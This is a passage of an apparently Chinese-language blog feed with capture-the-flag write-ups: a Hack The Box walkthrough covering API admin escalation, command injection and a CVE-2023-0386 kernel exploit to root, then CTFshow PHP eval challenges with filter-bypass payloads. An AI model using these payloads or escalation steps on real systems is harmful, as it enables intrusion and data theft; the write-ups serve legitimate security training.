class="hljs-string">&quot;0&quot;</span>:200,<span class="hljs-string">&quot;success&quot;</span>:1,<span class="hljs-string">&quot;data&quot;</span>:&#123;<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&quot;NTZRSlMtNDJLSjYtSTZXSTYtR1U5Mkc=&quot;</span>,<span class="hljs-string">&quot;format&quot;</span>:<span class="hljs-string">&quot;encoded&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>ç„¶å base 64 è§£ç </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">56QJS</span>-<span class="hljs-number">42</span>KJ6-I6WI6-GU92G<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">The endpoint <span class="hljs-keyword">in</span> makeInviteCode <span class="hljs-keyword">returns</span> <span class="hljs-keyword">encrypted</span> data. That message provides another endpoint <span class="hljs-keyword">to</span> query. That endpoint <span class="hljs-keyword">returns</span> a code <span class="hljs-keyword">value</span> that <span class="hljs-keyword">is</span> encoded <span class="hljs-keyword">with</span> what very common binary <span class="hljs-keyword">to</span> <span class="hljs-type">text</span> <span class="hljs-keyword">encoding</span> <span class="hljs-keyword">format</span>. What <span class="hljs-keyword">is</span> the <span class="hljs-type">name</span> <span class="hljs-keyword">of</span> that <span class="hljs-keyword">encoding</span>?<br>:base64<br></code></pre></td></tr></table></figure><h1 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h1><p>æ³¨å†Œç™»å½•è´¦å·ç„¶åè¿›å»åˆ° <code>ACCESS</code> æŠ“åŒ…</p><p><img src="https://img.dkdun.cn/v1/2025/12/a14a654b8af50b27.png"></p><p>è·¯å¾„ <code>/api/v1/user/vpn/generate</code></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">What</span> is the path to the endpoint the page uses <span class="hljs-keyword">when</span> a user clicks on <span class="hljs-string">&quot;Connection Pack&quot;</span>?<br><span class="hljs-symbol">:/api/v1/user/vpn/generate</span><br></code></pre></td></tr></table></figure><h1 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h1><p>è®¿é—®æ¥å£ <code>/api/v1</code> è¿”å›äº†å¾ˆå¤šå…¶ä»–æ¥å£</p><p><img src="https://img.dkdun.cn/v1/2025/12/2d7ad1e6dde9a058.png"></p><p>è®¿é—® <code>/api/v1/admin/settings/update</code> æ¥å£è¿”å›äº†é”™è¯¯ä¿¡æ¯ï¼ŒåŠ ä¸Š <code>Content-type:application/json</code>ï¼Œç”¨ <code>PUT</code> æ–¹å¼è¯·æ±‚</p><p><img src="https://img.dkdun.cn/v1/2025/12/3aa6b728dd077173.png"></p><p>æç¤ºæ²¡æœ‰ <code>email</code> å‚æ•°ï¼Œè®¾ç½® <code>email</code> å‚æ•°ï¼Œä¸ºæ³¨å†Œçš„ email </p><p><img src="https://img.dkdun.cn/v1/2025/12/dd7812022fe4fd51.png"></p><p>å†æ¬¡è¯·æ±‚æç¤ºæ²¡æœ‰ <code>is_admin</code> å‚æ•°</p><p><img src="https://img.dkdun.cn/v1/2025/12/bf67adf68542895d.png"></p><p>å†è®¾ç½® <code>is_admin</code> å‚æ•°ä¸º 1</p><p><img src="https://img.dkdun.cn/v1/2025/12/da66390cc4a6df62.png"></p><p>è¿”å›äº†ç”¨æˆ·ä¿¡æ¯ï¼Œåº”è¯¥æ˜¯è¶ŠæƒæˆåŠŸäº†ï¼ŒGET è®¿é—®ä¸€ä¸‹ <code>/api/v1/admin/auth</code> è¿”å›äº† <code>true</code> ï¼Œè¯´æ˜ç¡®å®æˆåŠŸäº†</p><p><img src="https://img.dkdun.cn/v1/2025/12/ba02b821e91d349f.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">How many API endpoints are there under /api/v1/admin?<br>:3<br></code></pre></td></tr></table></figure><h1 id="Task-7"><a href="#Task-7" class="headerlink" title="Task 7"></a>Task 7</h1><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">What</span> <span class="hljs-title class_">API</span> endpoint can change a user account to an admin account?<br><span class="hljs-symbol">:/api/v1/admin/settings/update</span><br></code></pre></td></tr></table></figure><h1 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h1><p>POST è®¿é—® <code>/api/v1/admin/vpn/generate</code>ï¼Œè¿”å›</p><p><img src="https://img.dkdun.cn/v1/2025/12/90712f882cc62d7e.png"></p><p>ç„¶åéšä¾¿å¡«ä¸€ä¸ªç”¨æˆ·åä¹Ÿèƒ½è¿”å›ï¼Œç„¶åä¿®æ”¹å­—æ®µ</p><p><img src="https://img.dkdun.cn/v1/2025/12/e26da4534dc9155a.png"></p><p>è¯´æ˜å­˜åœ¨å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">What</span> <span class="hljs-title class_">API</span> endpoint has a command injection vulnerability <span class="hljs-keyword">in</span> it?<br><span class="hljs-symbol">:/api/v1/admin/vpn/generate</span><br></code></pre></td></tr></table></figure><h1 id="Task-9"><a href="#Task-9" class="headerlink" title="Task 9"></a>Task 9</h1><p>åå¼¹ä¸€ä¸ª shell ç›‘å¬</p><p><img src="https://img.dkdun.cn/v1/2025/12/d3a92eac39faa3c3.png"></p><p>ç„¶ååˆ—å‡ºæ–‡ä»¶ï¼Œæ‰¾åˆ°äº† <code>.env</code> å¾—åˆ°äº†ç”¨æˆ·å’Œå¯†ç </p><p><img src="https://img.dkdun.cn/v1/2025/12/4128efc1253ad083.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd">DB_HOST=<span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br>DB_DATABASE=htb_prod<br>DB_USERNAME=admin<br>DB_PASSWORD=SuperDuperPass123<br></code></pre></td></tr></table></figure><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">What <span class="hljs-keyword">file</span> <span class="hljs-keyword">is</span> commonly used <span class="hljs-keyword">in</span> PHP applications <span class="hljs-keyword">to</span> store environment <span class="hljs-keyword">variable</span> values?<br>:env<br></code></pre></td></tr></table></figure><h1 id="Submit-User-Flag"><a href="#Submit-User-Flag" class="headerlink" title="Submit User Flag"></a>Submit User Flag</h1><p>ssh ç›´æ¥ç™»å½•æ‹¿åˆ° userflag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">Submit the flag located in the admin user&#x27;s home directory.<br>:efdaf<span class="hljs-number">723</span>f<span class="hljs-number">682</span>ab<span class="hljs-number">1</span>f<span class="hljs-number">854</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">76e7909794</span><br></code></pre></td></tr></table></figure><h1 id="Task-11"><a href="#Task-11" class="headerlink" title="Task 11"></a>Task 11</h1><p>ç™»å½•æç¤ºæœ‰ email</p><p><img src="https://img.dkdun.cn/v1/2025/12/4f9a226d09f42536.png"></p><p>æŸ¥æ‰¾æœ‰ email çš„ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;mail&quot;</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/1d7cbf874fffd1da.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> email address <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> sender <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> email sent <span class="hljs-built_in">to</span> admin?<br>:ch4p@<span class="hljs-number">2</span>million.htb<br></code></pre></td></tr></table></figure><h1 id="Task-12"><a href="#Task-12" class="headerlink" title="Task 12"></a>Task 12</h1><p>æŸ¥çœ‹ admin å†…å®¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">From: ch4p &lt;ch4p@2million.htb&gt;<br>To: admin &lt;admin@2million.htb&gt;<br>Cc: g0blin &lt;g0blin@2million.htb&gt;<br>Subject: Urgent: Patch System OS<br>Date: Tue, 1 June 2023 10:45:22 -0700<br>Message-ID: &lt;9876543210@2million.htb&gt;<br>X-Mailer: ThunderMail Pro 5.2<br><br>Hey admin,<br><br>I<span class="hljs-string">&#x27;m know you&#x27;</span>re working as fast as you can to <span class="hljs-keyword">do</span> the DB migration. While we<span class="hljs-string">&#x27;re partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can&#x27;</span>t get popped by that.<br><br>HTB Godfather<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å…¶ä¸­æœ‰ä¸€ä¸ª <code>OverlayFS</code> æœ CVEï¼Œå…³äº <code>Linux kernel CVE</code> ï¼ŒLinux å†…æ ¸</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> <span class="hljs-number">2023</span> CVE ID <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> vulnerability <span class="hljs-keyword">in</span> that allows <span class="hljs-keyword">an</span> attacker <span class="hljs-built_in">to</span> move <span class="hljs-built_in">files</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> Overlay <span class="hljs-built_in">file</span> <span class="hljs-keyword">system</span> <span class="hljs-keyword">while</span> maintaining metadata like <span class="hljs-keyword">the</span> owner <span class="hljs-keyword">and</span> SetUID bits?<br>:CVE<span class="hljs-number">-2023</span><span class="hljs-number">-0386</span><br></code></pre></td></tr></table></figure><h1 id="Submit-Root-Flag"><a href="#Submit-Root-Flag" class="headerlink" title="Submit Root Flag"></a>Submit Root Flag</h1><p>å¼€ä¸¤ä¸ªç»ˆç«¯ï¼ŒæŠŠ CVE ä¼ åˆ°é¶æœºä¸Šï¼Œç¼–è¯‘ä¹‹åï¼ˆç¼–è¯‘ä¼šæŠ¥é”™ï¼Œä½†æ˜¯ä¸å½±å“ï¼‰åœ¨ç¬¬ä¸€ä¸ªç»ˆç«¯è¾“å…¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./fuse ./ovlcap/lower ./gc<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªç»ˆç«¯è¾“å…¥</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">./<span class="hljs-built_in">exp</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6e0210e649704aca.png"></p><p>æ‹¿åˆ° root æƒé™</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Submit the flag located in root&#x27;s home directory.<br>:3a<span class="hljs-number">62869985</span>c7bf<span class="hljs-number">6157</span>abcb<span class="hljs-number">2661</span>ce<span class="hljs-number">6983</span><br></code></pre></td></tr></table></figure><h1 id="CVE-2023-0386"><a href="#CVE-2023-0386" class="headerlink" title="CVE-2023-0386"></a>CVE-2023-0386</h1><p>å…·ä½“æ¼æ´åˆ†æï¼š<a href="https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/%EF%BC%8Chttps://github.com/chenaotian/CVE-2023-0386">https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/ï¼Œhttps://github.com/chenaotian/CVE-2023-0386</a></p><p>exploitï¼š<a href="https://github.com/xkaneiki/CVE-2023-0386/">https://github.com/xkaneiki/CVE-2023-0386/</a></p><p>è¿™ä¸ª CVE ä¸»è¦æ˜¯å…³äº Linux å†…æ ¸çš„ <code>OverlayFS</code> å­ç³»ç»Ÿï¼Œå½“ç”¨æˆ·å°†ä¸€ä¸ªå…·æœ‰æƒé™çš„æ–‡ä»¶ä»ä¸€ä¸ª nosuid æŒ‚è½½ç‚¹å¤åˆ¶åˆ°å¦ä¸€ä¸ªæŒ‚è½½ç‚¹æ—¶ï¼Œæœªç»æˆæƒçš„æ”»å‡»è€…å¯ä»¥æ‰§è¡Œ setuid æ–‡ä»¶ï¼Œå¯¼è‡´æƒé™æå‡ã€‚</p><p>æ¼æ´è§¦å‘é€»è¾‘æ˜¯å¦‚æœ <code>overlay</code> æ–‡ä»¶ç³»ç»Ÿå‘ç”Ÿäº†<code>copy-up</code> æ“ä½œï¼ˆå°è¯•ä¿®æ”¹ä¸‹å±‚æ–‡ä»¶ï¼Œè§¦å‘ä¸‹å±‚æ–‡ä»¶å‘ä¸Šå±‚æ‹·è´ï¼‰çš„æ—¶å€™ï¼Œå¦‚æœä¸‹å±‚æ–‡ä»¶ç³»ç»Ÿæ˜¯ä¸€ä¸ªç”¨æˆ·æ–‡ä»¶ç³»ç»Ÿï¼ˆæ¯”å¦‚ fuseï¼‰ï¼Œå¯ä»¥è‡ªå®šä¹‰ä»»ä½•æ–‡ä»¶ï¼Œä½†è¯¥æ–‡ä»¶ç³»ç»Ÿå­˜åœ¨é™åˆ¶ï¼ˆæ¯”å¦‚ nosuidï¼‰ï¼Œè¿™ä¸ªæ¼æ´å°±å…è®¸å°†ä¸‹å±‚ç”¨æˆ·è‡ªå®šä¹‰çš„ suid æ–‡ä»¶ä»ä¸€ä¸ª nosuid æ–‡ä»¶ç³»ç»Ÿæ‹·è´åˆ°ä¸€ä¸ªæ­£å¸¸æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œä»è€Œå¯¼è‡´éæ³• suid è·å–çœŸæ­£çš„ suid ç‰¹æƒï¼Œæ¯•ç«Ÿåœ¨æ–‡ä»¶æ‹·è´çš„æ—¶å€™å¹¶ä¸æ˜¯å•çº¯åœ°åªæ‹·è´æ–‡ä»¶å†…å®¹ï¼Œè¿˜åŒ…æ‹¬äº†æ–‡ä»¶çš„æƒé™ä¿¡æ¯ã€æ—¶é—´æˆ³ç­‰ä¿¡æ¯ä¸€èµ·è¢«æ‹·è´ã€‚</p><p>FUSE æ–‡ä»¶ç³»ç»Ÿï¼ˆFilesystem in Userspaceï¼‰,Linux ä¸‹çš„ç”¨æˆ·æ€æ–‡ä»¶ç³»ç»Ÿæ¥å£ï¼Œå…è®¸ç”¨æˆ·åœ¨ç”¨æˆ·ç©ºé—´ï¼ˆè€Œéå†…æ ¸ç©ºé—´ï¼‰å®ç°å’Œè¿è¡Œè‡ªå®šä¹‰çš„æ–‡ä»¶ç³»ç»Ÿã€‚å…è®¸åœ¨ç”¨æˆ·å±‚å®šä¹‰æ–‡ä»¶ç³»ç»Ÿçš„ä¸€äº›å›è°ƒå‡½æ•°æ¯”å¦‚ openã€write ç”šè‡³ getattr ç­‰æ–‡ä»¶å…ƒæ•°æ®ä¿¡æ¯ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€</category>
      
      <category>é¶æœº</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>APIè¶Šæƒ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFshow-å‘½ä»¤æ‰§è¡Œ</title>
    <link href="/2025/03/15/CTFshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2025/03/15/CTFshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<p><del>æœªå®Œå¾…ç»­</del> å·²å®Œç»“</p><span id="more"></span><h1 id="Web-29"><a href="#Web-29" class="headerlink" title="Web 29"></a>Web 29</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 00:26:48<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>å‘ç°è¿‡æ»¤äº† flagï¼Œå¯¹ <code>preg_match</code> è¿›è¡Œç»•è¿‡ï¼Œå¹¶ä¸” cat ä¹Ÿæ˜¯è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æ„é€  payload </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=system(&quot;ls&quot;);<br>?c=system(&quot;tac fla*.php&quot;);<br></code></pre></td></tr></table></figure><h1 id="Web-30"><a href="#Web-30" class="headerlink" title="Web 30"></a>Web 30</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 00:42:26<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿‡æ»¤äº† <code>flagã€systemã€php</code> ï¼Œé‚£ä¹ˆå¯¹äºå‘½ä»¤æ‰§è¡Œå‡½æ•°æˆ‘ä»¬é™¤äº† <code>system()</code> è¿˜èƒ½ç”¨ï¼š<strong>exec()ã€shell_exec()ã€passthru()ã€popen()ã€åå¼•å·ç­‰</strong>ï¼Œæ‰€ä»¥æˆ‘ä»¬èƒ½æ„é€  payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=passthru(&quot;tac fl??.ph*&quot;);<br></code></pre></td></tr></table></figure><p><code>tac</code> è¿˜èƒ½æ¢æˆ <code>tail</code></p><h1 id="Web-31"><a href="#Web-31" class="headerlink" title="Web 31"></a>Web 31</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 00:49:10<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç®€å•ç»•è¿‡ï¼Œpayload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=passthru(&quot;tac%09fl**&quot;);<br></code></pre></td></tr></table></figure><p>å› ä¸ºç©ºæ ¼å’Œ <code>.</code> ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œç©ºæ ¼å¯ä»¥ç”¨ <code>%09</code> æˆ– <code>&#123;$IFS&#125;</code> ç»•è¿‡ï¼Œ<code>flag.php</code> èƒ½ç”¨é€šé…ç¬¦ <code>*</code> ç»•è¿‡</p><h1 id="Web-32"><a href="#Web-32" class="headerlink" title="Web 32"></a>Web 32</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 00:56:31<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ— æ³•ç”¨æ›¿ä»£ç»•è¿‡äº†ï¼Œé‚£ä¹ˆå¯ä»¥è¯•è¯•æ–‡ä»¶åŒ…å«</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h1 id="Web-33"><a href="#Web-33" class="headerlink" title="Web 33"></a>Web 33</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 02:22:27<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br>//<br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>å°±æ¯” web32 å¤šè¿‡æ»¤äº†ä¸ªåŒå¼•å·ï¼Œå¯ä»¥ç”¨ä¸Šé¢çš„ payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br>?c=require$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h1 id="Web-34"><a href="#Web-34" class="headerlink" title="Web 34"></a>Web 34</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 04:21:29<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br><br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>åªæ˜¯å¤šè¿‡æ»¤äº†ä¸€ä¸ª <code>:</code> ï¼Œæ‰€ä»¥è¿˜èƒ½ç”¨æ–‡ä»¶åŒ…å«è¯»å–</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=require$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br>?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h1 id="Web-35"><a href="#Web-35" class="headerlink" title="Web 35"></a>Web 35</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 04:21:23<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br><br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    